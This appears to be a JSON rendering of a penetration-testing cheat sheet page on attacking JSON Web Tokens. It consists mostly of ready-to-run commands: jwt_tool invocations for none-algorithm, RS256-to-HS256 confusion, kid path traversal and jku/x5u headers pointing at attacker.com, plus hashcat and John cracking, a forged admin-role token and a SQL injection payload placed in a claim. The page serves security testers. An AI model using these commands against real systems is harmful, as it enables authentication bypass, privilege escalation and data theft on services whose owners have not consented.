@@ -1,0 +1,164 @@
+{
+    "title": "JWT",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Technologies",
+            "url": "/enumeration/webservices"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "Tools",
+            "type": "code_block",
+            "content": [
+                "# https://github.com/ticarpi/jwt_tool",
+                "# https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology",
+                "",
+                "# https://github.com/hahwul/jwt-hack",
+                "# https://github.com/mazen160/jwt-pwn",
+                "# https://github.com/mBouamama/MyJWT",
+                "# https://github.com/DontPanicO/jwtXploiter",
+                "",
+                "# Test all common attacks",
+                "python3 jwt_tool.py -t https://url_that_needs_jwt/ -rh \"Authorization: Bearer JWT\" -M at -cv \"Welcome user!\"",
+                "",
+                "# Hashcat",
+                "# dictionary attacks ",
+                "hashcat -a 0 -m 16500 jwt.txt passlist.txt",
+                "# rule-based attack  ",
+                "hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule",
+                "# brute-force attack",
+                "hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6",
+                "",
+                "",
+                "# Crack",
+                "pip install PyJWT",
+                "# https://github.com/Sjord/jwtcrack",
+                "# https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py",
+                "jwt2john.py JWT",
+                "./john /tmp/token.txt --wordlist=wordlist.txt",
+                "",
+                "# Wordlist generator crack tokens:",
+                "# https://github.com/dariusztytko/token-reverser",
+                "",
+                "# RS256 to HS256",
+                "openssl s_client -connect www.google.com:443 | openssl x509 -pubkey -noout > public.pem",
+                "cat public.pem | xxd -p | tr -d \"\\\\n\" > hex.txt",
+                "# Sign JWT with hex.txt ",
+                "",
+                "# Generate JWT from terminal",
+                "pip install pyjwt",
+                "python3 -c 'import jwt;print(jwt.encode({\"role\": \"admin\"},\"SECRET\",algorithm=\"HS256\").decode(\"UTF-8\"))'"
+            ]
+        },
+        {
+            "heading": "General info",
+            "type": "code_block",
+            "content": [
+                "1. Leak Sensitive Info",
+                "2. Send without signature",
+                "3. Change algorythm r to h",
+                "4. Crack the secret h256",
+                "5. KID manipulation",
+                "",
+                "eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE1ODQ2NTk0MDAsInVzZXJuYW1lIjoidGVtcHVzZXI2OSIsInJvbGVzIjpbIlJPTEVfRVhURVJOQUxfVVNFUiJdLCJhcHBDb2RlIjoiQU5UQVJJX0FQSSIsImlhdCI6MTU4NDU3MzAwMH0.AOHXCcMFqYFeDSYCEjeugT26RaZLzPldqNAQSlPNpKc2JvdTG9dr2ini4Z42dd5xTBab-PYBvlXIJetWXOX80A",
+                "",
+                "https://trustfoundry.net/jwt-hacking-101/",
+                "https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9",
+                "https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/",
+                "https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a",
+                "",
+                "- JKU & X5U Headers - JWK",
+                "    - Header injection",
+                "    - Open redirect",
+                "",
+                "",
+                "",
+                "- Remember test JWT after session is closed"
+            ]
+        },
+        {
+            "heading": "Attacks",
+            "subheadings": [
+                {
+                    "heading": "Header",
+                    "type": "code_block",
+                    "content": [
+                        "# None algorithm",
+                        "python3 jwt_tool.py <JWT> -X a",
+                        "",
+                        "# From RS256 to HS256",
+                        "python3 jwt_tool.py <JWT> -S hs256 -k public.pem",
+                        "",
+                        "# Not checked signature",
+                        "python3 jwt_tool.py <JWT> -I -pc name -pv admin",
+                        "",
+                        "# Crack secret key",
+                        "python3 jwt_tool.py <JWT> -C -d secrets.txt ",
+                        "",
+                        "# Null kid",
+                        "python3 jwt_tool.py <JWT> -I -hc kid -hv \"../../dev/null\" -S hs256 -p \"\"",
+                        "",
+                        "# Use source file as kid to verify signature",
+                        "python3 jwt_tool.py -I -hc kid -hv \"path/of/the/file\" -S hs256 -p \"Content of the file\"",
+                        "",
+                        "# jku manipulation for open redirect",
+                        "python3 jwt_tool.py <JWT> -X s -ju \"https://attacker.com/jwttool_custom_jwks.json\"",
+                        "",
+                        "# x5u manipulation for open redirect",
+                        "openssl req -newkey rsa:2048 -nodes -keyout private.pem -x509 -days 365 -out attacker.crt -subj \"/C=AU/L=Brisbane/O=CompanyName/CN=pentester\"",
+                        "python3 jwt_tool.py <JWT> -S rs256 -pr private.pem -I -hc x5u -hv \"https://attacker.com/custom_x5u.json\""
+                    ]
+                },
+                {
+                    "heading": "Payload",
+                    "type": "code_block",
+                    "content": [
+                        "# SQLi",
+                        "python3 jwt_tool.py <JWT> -I -pc name -pv \"imparable' ORDER BY 1--\" -S hs256 -k public.pem",
+                        "",
+                        "# Manipulate other values to change expiration time or userID for example"
+                    ]
+                }
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2025-11-04T08:48:27.369Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/webservices/jwt.md",
+        "previous_page": {
+            "title": "ASP.NET",
+            "url": "/enumeration/webservices/.net"
+        },
+        "next_page": {
+            "title": "GitHub",
+            "url": "/enumeration/webservices/github"
+        }
+    }
+}
